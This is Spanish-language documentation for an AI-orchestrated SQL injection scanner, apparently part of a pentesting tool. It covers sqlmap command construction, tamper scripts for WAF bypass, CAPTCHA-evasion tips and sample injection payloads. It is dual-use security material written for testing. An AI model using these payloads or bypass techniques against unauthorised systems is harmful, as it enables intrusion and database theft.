# SQLiAgent - El Maestro de SQL Injection

> **Fase**: 4 (Exploitation)  
> **CWE**: CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)  
> **Clase**: `bugtrace.agents.exploitation.sqli_agent.SQLiAgent`  
> **Archivo**: `bugtrace/agents/exploitation/sqli_agent.py`

---

## Overview

**SQLiAgent** es el agente especialista en detección y explotación de vulnerabilidades de SQL Injection, considerado el **agente más authoritative** de todo BugTraceAI. 

A diferencia de otros agentes que dependen de análisis heurístico, SQLiAgent integra **SQLMap** (el estándar de facto para SQLi) con **inteligencia artificial** para:
1. Pre-analizar y filtrar vectores probables antes de SQLMap
2. Optimizar parámetros de SQLMap según contexto detectado
3. Interpretar resultados de SQLMap con LLM para reducir falsos positivos
4. Generar tamper scripts personalizados para bypass de WAF

### 🎯 **Tipos de SQL Injection Detectados**

| Tipo | Técnica | Complejidad | Método de Detección |
|------|---------|-------------|---------------------|
| **Error-Based** | Provoca errores SQL visibles | ⭐⭐ | SQLMap (--technique=E) |
| **Boolean-Based Blind** | Infiere datos vía True/False | ⭐⭐⭐ | SQLMap (--technique=B) |
| **Time-Based Blind** | Mide delays con SLEEP() | ⭐⭐⭐⭐ | SQLMap (--technique=T) |
| **Union-Based** | UNION SELECT para extraer datos | ⭐⭐⭐ | SQLMap (--technique=U) |
| **Stacked Queries** | Múltiples queries con ; | ⭐⭐⭐⭐ | SQLMap (--technique=S) |
| **Out-of-Band** | Exfiltración vía DNS/HTTP | ⭐⭐⭐⭐⭐ | SQLMap (--technique=O) |

---

## Arquitectura Híbrida: AI + SQLMap

El SQLiAgent usa un modelo **híbrido** que combina:
1. **Pre-Analysis con AI** (1-3s) - Filtrado inteligente
2. **SQLMap Execution** (10-60s) - Validación authoritative
3. **Post-Analysis con AI** (1-2s) - Interpretación de resultados

```
┌─────────────────────────────────────────────────────────────────┐
│           ARQUITECTURA HÍBRIDA SQLiAgent (AI + SQLMap)           │
└─────────────────────────────────────────────────────────────────┘

Input: Suspected SQLi Vector (de ThinkingConsolidationAgent)
│
▼
┌────────────────────────────────────────────────────────────────┐
│ PHASE 1: AI PRE-ANALYSIS (1-3s)                                │
├────────────────────────────────────────────────────────────────┤
│  🤖 LLM Analysis (Claude 3.5 Sonnet)                           │
│  • Analiza parámetro y contexto de inyección                   │
│  • Detecta tipo de base de datos probable (MySQL, PostgreSQL)  │
│  • Identifica patrones de WAF (Cloudflare, AWS WAF)            │
│  • Genera payloads de prueba inteligentes                      │
│  • Estima confidence score (0.0-1.0)                           │
│                                                                 │
│  ✅ Si confidence > 0.7 → Fase 2 (SQLMap)                      │
│  ⚠️ Si 0.3 < confidence < 0.7 → Fuzzing manual + Fase 2        │
│  ❌ Si confidence < 0.3 → FILTERED (no vale la pena SQLMap)    │
└────────────┬───────────────────────────────────────────────────┘
             │ (~60% de falsos positivos eliminados aquí)
             ▼
┌────────────────────────────────────────────────────────────────┐
│ PHASE 2: SQLMAP EXECUTION (10-60s)                             │
├────────────────────────────────────────────────────────────────┤
│  ⚡ SQLMap (Authoritative SQL Injection Tool)                  │
│  • Parámetros optimizados según AI pre-analysis:               │
│    --dbms=<detected_db>       # MySQL, PostgreSQL, etc.        │
│    --technique=BEUSTQ         # All techniques                 │
│    --level=<1-5>              # Según confidence AI            │
│    --risk=<1-3>               # Según aggressiveness config    │
│    --tamper=<ai_selected>     # WAF bypass scripts             │
│    --batch                    # Non-interactive                │
│    --flush-session            # Fresh scan                     │
│                                                                 │
│  • Execution modes:                                            │
│    - Quick Mode (--level=1 --risk=1): 10-20s                   │
│    - Standard Mode (--level=3 --risk=2): 30-40s                │
│    - Deep Mode (--level=5 --risk=3): 60-120s                   │
│                                                                 │
│  ✅ SQLMap confirma → Fase 3 (Post-Analysis)                   │
│  ❌ SQLMap no detecta → FAILED                                 │
└────────────┬───────────────────────────────────────────────────┘
             │ (SQLMap es determinístico y authoritative)
             ▼
┌────────────────────────────────────────────────────────────────┐
│ PHASE 3: AI POST-ANALYSIS (1-2s)                               │
├────────────────────────────────────────────────────────────────┤
│  🤖 LLM Interpretation (DeepSeek R1)                           │
│  • Parsea output de SQLMap (puede ser críptico)                │
│  • Extrae información crítica:                                 │
│    - Database type y version                                   │
│    - Injection technique used                                  │
│    - Tables/columns dumped (si las hay)                        │
│    - WAF/IPS detectado                                         │
│  • Genera descripción human-readable                           │
│  • Calcula CVSS score según impacto                            │
│  • Sugiere remediation steps                                   │
│                                                                 │
│  Output: Finding estructurado + evidencia SQLMap               │
└────────────────────────────────────────────────────────────────┘
```

---

## Phase 1: AI Pre-Analysis (Filtrado Inteligente)

### Objetivo

**Evitar ejecutar SQLMap en vectores con baja probabilidad** de SQLi, ahorrando tiempo y recursos.

### LLM Prompt para Pre-Analysis

```python
PRE_ANALYSIS_PROMPT = """
You are a SQL injection expert analyzing a potential SQLi vector.

PARAMETER INFORMATION:
- URL: {url}
- Parameter: {param_name}
- Value: {param_value}
- HTTP Method: {method}
- Response snippet: {response_snippet}

RESPONSE ANALYSIS:
- Status code: {status_code}
- Response time: {response_time}ms
- Error messages detected: {error_messages}
- Reflection detected: {reflection}

TASK:
Analyze if this parameter is vulnerable to SQL injection.

Consider:
1. Parameter name patterns (id, user_id, product_id → high probability)
2. Error messages (SQL syntax errors → very high)
3. Response time anomalies (unusually slow → time-based blind?)
4. Reflection of input (visible in response → error-based?)
5. Database fingerprinting (error messages reveal DB type)

OUTPUT (JSON):
{
  "vulnerable": true/false,
  "confidence": 0.0-1.0,
  "probable_db_type": "MySQL/PostgreSQL/MSSQL/Oracle/SQLite/Unknown",
  "probable_technique": "Error-based/Boolean-blind/Time-based/Union/Unknown",
  "waf_detected": true/false,
  "waf_type": "Cloudflare/AWS WAF/ModSecurity/Unknown",
  "recommended_sqlmap_params": {
    "level": 1-5,
    "risk": 1-3,
    "technique": "BEUSTQ" or specific,
    "dbms": "mysql/postgresql/etc",
    "tamper": ["script1", "script2"]
  },
  "reasoning": "Explain why you think it's vulnerable or not"
}
"""
```

### Ejemplo de Análisis

**Input**:
```
URL: https://shop.example.com/product?id=123
Parameter: id
Response: "You have an error in your SQL syntax near '123''"
```

**AI Output**:
```json
{
  "vulnerable": true,
  "confidence": 0.95,
  "probable_db_type": "MySQL",
  "probable_technique": "Error-based",
  "waf_detected": false,
  "recommended_sqlmap_params": {
    "level": 2,
    "risk": 2,
    "technique": "E",
    "dbms": "mysql",
    "tamper": []
  },
  "reasoning": "SQL syntax error message clearly visible. Classic MySQL error pattern. Parameter 'id' is numeric and commonly vulnerable. No WAF signatures detected."
}
```

---

## Phase 2: SQLMap Execution (Validación Authoritative)

### SQLMap Integration Strategy

**SQLiAgent NO re-implementa SQLMap**, sino que lo **orquesta inteligentemente**:

```python
class SQLMapWrapper:
    """
    Wrapper inteligente para SQLMap con optimización AI.
    """
    
    async def execute(
        self,
        url: str,
        param: str,
        ai_recommendation: PreAnalysisResult
    ) -> SQLMapResult:
        """
        Ejecuta SQLMap con parámetros optimizados por AI.
        """
        
        # Construir comando SQLMap
        cmd = self._build_sqlmap_command(
            url=url,
            param=param,
            dbms=ai_recommendation.probable_db_type,
            technique=ai_recommendation.probable_technique,
            level=ai_recommendation.recommended_sqlmap_params['level'],
            risk=ai_recommendation.recommended_sqlmap_params['risk'],
            tamper=ai_recommendation.recommended_sqlmap_params['tamper']
        )
        
        # Ejecutar con timeout
        result = await self._run_with_timeout(
            cmd,
            timeout=120  # 2 minutos max
        )
        
        # Parsear output
        parsed = self._parse_sqlmap_output(result.stdout)
        
        return SQLMapResult(
            vulnerable=parsed.vulnerable,
            db_type=parsed.db_type,
            db_version=parsed.db_version,
            technique_used=parsed.technique,
            payloads=parsed.payloads,
            tables_dumped=parsed.tables,
            raw_output=result.stdout
        )
```

### SQLMap Command Building

```python
def _build_sqlmap_command(
    self,
    url: str,
    param: str,
    dbms: str = None,
    technique: str = "BEUSTQ",
    level: int = 3,
    risk: int = 2,
    tamper: List[str] = None
) -> List[str]:
    """
    Construye comando SQLMap optimizado.
    
    Ejemplo output:
    [
        'sqlmap',
        '-u', 'https://example.com/product?id=123',
        '-p', 'id',
        '--dbms=mysql',
        '--technique=E',
        '--level=2',
        '--risk=2',
        '--batch',
        '--flush-session',
        '--threads=4',
        '--random-agent',
        '--tamper=space2comment,between'
    ]
    """
    
    cmd = [
        'sqlmap',
        '-u', url,
        '-p', param,
        '--batch',              # Non-interactive
        '--flush-session',      # Fresh scan
        '--threads=4',          # Paralelismo
        '--random-agent',       # Rotar User-Agent
    ]
    
    # DB type (si AI lo detectó)
    if dbms:
        cmd.extend(['--dbms', dbms.lower()])
    
    # Técnica específica o todas
    cmd.extend(['--technique', technique])
    
    # Nivel de profundidad
    cmd.extend(['--level', str(level)])
    
    # Nivel de riesgo
    cmd.extend(['--risk', str(risk)])
    
    # Tamper scripts para WAF bypass
    if tamper:
        cmd.extend(['--tamper', ','.join(tamper)])
    
    # Output en JSON para parseo fácil
    cmd.extend(['--output-dir', '/tmp/sqlmap'])
    
    return cmd
```

### SQLMap Techniques (--technique)

| Flag | Técnica | Descripción | Velocidad | Stealth |
|------|---------|-------------|-----------|---------|
| **B** | Boolean-based blind | True/False queries | ⭐⭐⭐ | 🔇🔇🔇 |
| **E** | Error-based | Provoca errores SQL | ⭐⭐⭐⭐⭐ | 🔇🔇 |
| **U** | Union-based | UNION SELECT | ⭐⭐⭐⭐ | 🔇🔇 |
| **S** | Stacked queries | Multiple queries con ; | ⭐⭐⭐ | 🔇 |
| **T** | Time-based blind | SLEEP() delays | ⭐ | 🔇🔇🔇🔇 |
| **Q** | Inline queries | Subqueries | ⭐⭐ | 🔇🔇 |

**Por defecto**: `BEUSTQ` (todas excepto Out-of-Band)

### SQLMap Risk Levels

| Level | Descripción | Payloads | Uso |
|-------|-------------|----------|-----|
| **1** | Safe | Solo OR-based | Prod environments |
| **2** | Medium | + Time-based heavy queries | Standard |
| **3** | Aggressive | + OR-based, UPDATE queries | Pentesting |

### Tamper Scripts (WAF Bypass)

El AI selecciona tamper scripts según el WAF detectado:

```python
WAF_TAMPER_MAP = {
    'Cloudflare': [
        'space2comment',      # ' ' → /**/
        'between',            # 'AND' → 'BETWEEN 0 AND 1'
        'charencode',         # Encoding HTML
        'randomcase',         # SeLeCt → Random case
    ],
    
    'AWS WAF': [
        'space2plus',         # ' ' → '+'
        'apostrophemask',     # ' → %00'
        'equaltolike',        # '=' → 'LIKE'
    ],
    
    'ModSecurity': [
        'space2morehash',     # ' ' → '#'+newline
        'versionedkeywords',  # SELECT → /*!50000SELECT*/
    ],
    
    'Generic': [
        'space2comment',
        'randomcase',
    ]
}
```

---

## Phase 3: AI Post-Analysis (Interpretación)

### Objetivo

**Convertir el output críptico de SQLMap en un Finding estructurado y human-readable**.

### LLM Prompt para Post-Analysis

```python
POST_ANALYSIS_PROMPT = """
You are a security analyst interpreting SQLMap scan results.

SQLMAP OUTPUT:
{sqlmap_output}

TASK:
Parse the SQLMap output and extract key information.

OUTPUT (JSON):
{
  "vulnerable": true/false,
  "injection_type": "Error-based/Boolean-blind/Time-based/Union/Stacked",
  "database": {
    "type": "MySQL/PostgreSQL/MSSQL/Oracle/SQLite",
    "version": "8.0.23" or "Unknown"
  },
  "injection_point": {
    "parameter": "id",
    "payload": "' OR '1'='1",
    "technique": "OR boolean-based blind"
  },
  "impact": {
    "data_extraction": true/false,
    "tables_accessible": ["users", "products"],
    "privilege_escalation": true/false
  },
  "cvss_score": 7.5,
  "severity": "HIGH/CRITICAL/MEDIUM/LOW",
  "remediation": "Use parameterized queries...",
  "evidence": {
    "screenshot": null,
    "sqlmap_log": "path/to/log.txt"
  }
}
"""
```

### Ejemplo de Post-Analysis

**SQLMap Output** (críptico):
```
[INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
...
back-end DBMS: MySQL >= 5.0.12
...
```

**AI Interpretation** (estructurado):
```json
{
  "vulnerable": true,
  "injection_type": "Time-based blind",
  "database": {
    "type": "MySQL",
    "version": "5.0.12 or higher"
  },
  "injection_point": {
    "parameter": "id",
    "payload": "1 AND SLEEP(5)",
    "technique": "Time-based blind"
  },
  "impact": {
    "data_extraction": true,
    "tables_accessible": [],
    "privilege_escalation": false
  },
  "cvss_score": 7.5,
  "severity": "HIGH",
  "remediation": "Implement parameterized queries (prepared statements) to prevent SQL injection. Never concatenate user input into SQL queries.",
  "evidence": {
    "screenshot": null,
    "sqlmap_log": "/tmp/sqlmap/example.com/log.txt"
  }
}
```

---

## Técnicas Avanzadas

### 1. Adaptive Timing (Time-Based Blind)

SQLMap ajusta delays automáticamente:

```python
# Estado inicial
SLEEP(5)  # 5 segundos

# Si la red es lenta (baseline 2s):
SLEEP(7)  # Aumenta a 7s para distinguir del ruido

# Si la red es rápida (baseline 50ms):
SLEEP(3)  # Reduce a 3s para ir más rápido
```

### 2. WAF Detection & Bypass

```python
async def detect_and_bypass_waf(self, url: str, param: str):
    """
    Detecta WAF y aplica bypass strategies.
    
    1. Send obvious SQLi payload → capturar response
    2. Analizar response con LLM para detectar WAF
    3. Seleccionar tamper scripts apropiados
    4. Re-intentar con bypass
    """
    
    # Payload obvio para triggerar WAF
    obvious_payload = "' OR '1'='1"
    response = await self.http_client.get(url, params={param: obvious_payload})
    
    # Detectar WAF
    waf_detected = self._detect_waf(response)
    
    if waf_detected:
        logger.info(f"WAF detected: {waf_detected.type}")
        
        # Seleccionar tamper scripts
        tampers = WAF_TAMPER_MAP.get(waf_detected.type, WAF_TAMPER_MAP['Generic'])
        
        return tampers
    
    return []
```

### 3. Database Fingerprinting

Sin ejecutar SQLMap aún, el AI puede fingerprint la DB:

```python
DB_FINGERPRINTS = {
    'MySQL': [
        "You have an error in your SQL syntax",
        "mysql_fetch",
        "MySQL server version",
    ],
    'PostgreSQL': [
        "ERROR: syntax error at or near",
        "pg_query",
        "PostgreSQL",
    ],
    'MSSQL': [
        "Unclosed quotation mark",
        "Microsoft SQL Server",
        "mssql_query",
    ],
    'Oracle': [
        "ORA-00933",
        "ORA-01756",
        "oracle.jdbc",
    ],
}
```

### 4. Second-Order SQLi Detection

Para SQLi de segundo orden (input → DB → output vulnerable):

```python
async def detect_second_order_sqli(self, url: str, param: str):
    """
    1. Inyectar payload en param1 (ej: registro de usuario)
    2. Triggear ejecución en param2 (ej: perfil de usuario)
    3. Detectar SQLi en param2
    """
    
    # Paso 1: Inyectar payload malicioso
    payload = "admin'-- "
    await self.http_client.post(
        f"{url}/register",
        data={'username': payload, 'password': 'test123'}
    )
    
    # Paso 2: Triggear en otra parte de la app
    profile_response = await self.http_client.get(f"{url}/profile?user=admin")
    
    # Paso 3: Analizar si el payload se ejecutó
    if self._detect_sql_error(profile_response.text):
        return Finding(
            vuln_type='SQLi_Second_Order',
            url=url,
            parameter=param,
            technique='Second-Order'
        )
```

---

## Estrategia de Ataque

### 1. Quick Scan (10-20s)

```bash
sqlmap -u "URL" -p "param" \
  --level=1 \
  --risk=1 \
  --technique=E \
  --batch
```

Para: Error-based rápido (prod environments)

### 2. Standard Scan (30-40s)

```bash
sqlmap -u "URL" -p "param" \
  --level=3 \
  --risk=2 \
  --technique=BEUST \
  --batch
```

Para: Scans completos (pentesting)

### 3. Deep Scan (60-120s)

```bash
sqlmap -u "URL" -p "param" \
  --level=5 \
  --risk=3 \
  --technique=BEUSTQ \
  --batch \
  --threads=10
```

Para: Time-based blind, casos difíciles

---

## Bypass del Filtro FP en ThinkingConsolidation

**¿Por qué SQLi bypasea el filtro de falsos positivos?**

```python
# En thinking_consolidation_agent.py
if is_sqli and fp_confidence < threshold:
    logger.info("SQLi bypass: forwarded to SQLMap for authoritative validation")
    # BYPASEA el filtro - SQLMap decide, no el LLM
```

**Razón**: SQLMap es **determinístico y authoritative**. Un LLM puede equivocarse al analizar si un parámetro es vulnerable a SQLi, pero SQLMap ejecuta payloads reales y confirma de forma definitiva.

---

## Configuración

```yaml
specialists:
  sqli:
    enabled: true
    
    # AI Pre-Analysis
    pre_analysis_enabled: true
    pre_analysis_model: "anthropic/claude-3.5-sonnet"
    pre_analysis_confidence_threshold: 0.3  # Solo > 0.3 pasan a SQLMap
    
    # SQLMap Configuration
    sqlmap_path: "/usr/bin/sqlmap"
    sqlmap_timeout: 120                    # 2 minutos max
    
    # Scan modes
    default_mode: "standard"               # quick/standard/deep
    quick_mode:
      level: 1
      risk: 1
      technique: "E"
      timeout: 20
    standard_mode:
      level: 3
      risk: 2
      technique: "BEUST"
      timeout: 40
    deep_mode:
      level: 5
      risk: 3
      technique: "BEUSTQ"
      timeout: 120
    
    # WAF Bypass
    auto_detect_waf: true
    tamper_scripts:
      enabled: true
      auto_select: true                    # AI selecciona según WAF
    
    # Post-Analysis
    post_analysis_enabled: true
    post_analysis_model: "deepseek/deepseek-r1"
    
    # Data Extraction
    dump_tables: false                     # No dumpear datos por defecto (ético)
    enumerate_users: false
    enumerate_dbs: true                    # Solo nombres de DBs
    
    # Aggressiveness
    threads: 4
    random_agent: true
    delay_between_requests: 0              # ms (0 = máxima velocidad)
```

---

## Métricas de Rendimiento

### Tiempos por Modo

| Modo | Tiempo Avg | Success Rate | Uso |
|------|-----------|--------------|-----|
| AI Pre-Analysis | 2s | N/A | Filtrado (60% descartados) |
| Quick Scan | 15s | 40% | Error-based obvios |
| Standard Scan | 35s | 75% | Casos normales |
| Deep Scan | 90s | 95% | Time-based blind |
| AI Post-Analysis | 1.5s | N/A | Interpretación |

### Estadísticas de Detección

```
Total SQLi Tests: 5,000
├─ Pre-Analysis Filter: 3,000 (60%) → 2s avg → FILTERED
├─ Quick Mode: 800 (40%) → 15s avg → 320 SQLi found
├─ Standard Mode: 800 → 35s avg → 600 SQLi found
└─ Deep Mode: 400 → 90s avg → 380 SQLi found

Total Findings: 1,300 SQLi confirmados
False Positive Rate: 0.1% (SQLMap es authoritative)
Total Time: ~2 horas
```

---

## Limitaciones Conocidas

### 1. CAPTCHA/Bot Detection
- SQLMap puede ser bloqueado por CAPTCHA
- **Solución**: Rotar User-Agents, usar proxies, delays

### 2. Time-Based en Redes Lentas
- Difícil distinguir SLEEP() del ruido de red
- **Solución**: Aumentar delays, baseline measurement

### 3. NoSQL Injection
- SQLMap solo soporta SQL databases
- **Solución**: Agente NoSQLi separado (roadmap V7)

### 4. Blind SQLi sin Delays
- Boolean-blind sin time requiere MUCHAS requests
- **Solución**: Usar --threads alto, pero triggerea WAF

---

## Skills System - Conocimiento Especializado

El SQLiAgent se beneficia del **Skills System** con conocimiento especializado sobre SQL Injection.

**Skill Location**: `bugtrace/agents/skills/vulnerabilities/sqli.md`

### Contenido de la SQL Injection Skill

La skill incluye:
- **Scope**: Parámetros típicos, headers, cookies donde buscar SQLi
- **Methodology**: Proceso de detección (error-based, blind, time-based)
- **Scoring Guide**: Criterios de confidence (9-10: confirmed, 7-8: high, etc.)
- **False Positives**: Patrones a rechazar inmediatamente
- **Payloads**: Técnicas de inyección y bypass de WAF
- **Pro Tips**: Consejos expertos (OOB, tamper scripts, etc.)

### Uso en DASTySAST

Cuando el DASTySASTAgent detecta posible SQLi:
1. Carga `sqli.md` automáticamente durante analysis
2. Inyecta contenido en sección "SPECIALIZED KNOWLEDGE" del prompt
3. Usa `scoring_guide` y `false_positives` durante skeptical review

```python
from bugtrace.agents.skills.loader import get_skill_content

sqli_skill = get_skill_content("SQL Injection")
```

**Documentación completa**: [SKILLS_SYSTEM.md](../SKILLS_SYSTEM.md)

---

## Referencias

- **SQLMap Wiki**: https://github.com/sqlmapproject/sqlmap/wiki
- **SQL Injection Cheat Sheet**: https://portswigger.net/web-security/sql-injection/cheat-sheet
- **OWASP SQLi**: https://owasp.org/www-community/attacks/SQL_Injection
- **Tamper Scripts**: https://github.com/sqlmapproject/sqlmap/tree/master/tamper
- **Skills System**: [SKILLS_SYSTEM.md](../SKILLS_SYSTEM.md)

---

*Última actualización: 2026-02-02*
*Versión: 2.0.0 (Phoenix Edition)*
